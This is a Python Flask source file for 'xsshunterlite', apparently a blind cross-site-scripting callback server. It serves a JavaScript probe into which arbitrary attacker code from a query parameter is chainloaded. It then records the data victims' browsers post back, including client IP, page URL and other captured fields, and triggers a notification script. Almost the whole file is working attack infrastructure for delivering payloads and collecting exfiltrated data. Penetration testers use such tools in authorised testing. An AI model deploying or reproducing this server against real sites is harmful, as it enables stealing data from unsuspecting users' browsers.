#!/usr/bin/python
from flask import Flask, request, Response
from db import create_connection, insert_interaction, create_db
from flask_cors import CORS
from subprocess import run, PIPE
import logging
import os

database = r"/var/www/xsshunterlite/sqlite.db"

app = Flask(__name__)
CORS(app)
handler = logging.FileHandler("/var/www/xsshunterlite/api.log")
app.logger.addHandler(handler)
app.logger.setLevel(logging.INFO)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def deliver_probe(path):  
    app.logger.info('Requested probe')

    with open(  os.path.dirname(app.instance_path) + "/www/probe.js", "r", encoding="utf8" ) as probe_handler:
        probejs = probe_handler.read()
              
    domain = request.headers.get( 'Host' )
    eval = request.args.get( 'e' )
    if eval is None:
        eval = ""
    
    probejs = probejs.replace( '[HOST_URL]', "https://" + domain )
    probejs = probejs.replace( '[CHAINLOAD_REPLACE_ME]', eval )

    return Response(probejs, mimetype='text/javascript')

@app.route('/js_callback', methods=['POST'])
def record_interaction():
    app.logger.info('Recording callback')
    
    json = request.get_json(force=True)
    json['client_ip'] = request.remote_addr

    notificationText='xss callback from {}|{}\n'.format(json['client_ip'],json['url'])
    run(['/var/www/xsshunterlite/notify_xss.sh'], stdout=PIPE, input=notificationText.encode('utf-8'))
    
    try:
        conn = create_connection(database)
        insert_interaction(conn, json)
    except Exception as e:
        app.logger.error(e)
    finally:
        conn.close()

    return "ok"

app.logger.info('Starting xsshunterlite')

conn = create_connection(database)
try:
    create_db(conn)
finally:
    conn.close()